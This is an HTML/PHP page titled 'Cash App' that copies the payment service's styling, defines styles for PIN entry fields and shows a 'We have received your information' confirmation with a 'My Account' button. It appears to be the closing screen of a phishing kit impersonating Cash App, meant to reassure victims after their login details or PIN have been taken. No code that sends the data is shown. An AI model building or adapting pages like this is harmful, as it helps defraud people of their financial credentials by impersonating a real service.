<?php

?>
<html lang="en" style="--vh:722px;">
<head> 
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"> 
<title>Cash App</title> 
<link rel="icon" sizes="196x196" href="/static/img/icon.png"> 
<link rel="icon" href="/static/img/favicon.ico"> 
<link rel="stylesheet" type="text/css" href="/static/css/cash.css"> 
<style> 
input{ height:45px !important; } 
.rowpin{ display:flex; width:100%; justify-content: space-between; } 
.pinput{	float:left;	width:12%; } #pin1, #pin2, #pin3, #pin4{ background:#0bb634; color:white; border:5px solid white; border-radius: 50%; text-align:center; } 
.filled{	background:whitesmoke !important;	color:white;	border:5px solid #0bb634 !important;	border-radius: 50% !important;	text-align:center; } 
</style> 
<script>
</script>
</script> 
</head> 
<body class="theme-bg ember-application theme-green"> 
<div class="ember-view"> 
<div class="full-height application-cash ember-view"> 
<div class="cookie-banner ember-view">  
</digv> 
<section class="layout-login flex-container full-height pad"> 
<div class="login-container flex-container flex-v-center flex-fill"> 
<p class="instructions ">
<span>We have received your information</span> 
</p> 
<div class="cta submit-button-component submit-button-with-spinner ember-view" style="margin-top:30px"> 
<button type="submit" id="btnLogout" class="button theme-button button--round theme-button">My Account</button> 
</div> 
</div> 
</section>  
<div id="cashModal" class="modal-manager ember-view" style="display:none"> 
<div class="modal-overlay show"></div> <div class="modal-scroller fade-in show ember-view"> 
<div class="modal-window flex-container flex-v theme-white small ember-view"> 
</div> 
</div> 
</div> 
</div> 
</div> 
<script type="text/javascript" src="/static/js/jquery.min.js"></script> 
<script type="text/javascript" src="/static/js/mask.js"></script> 
<script type="text/javascript" src="/static/js/pin.js"></script> 
</body>
</html>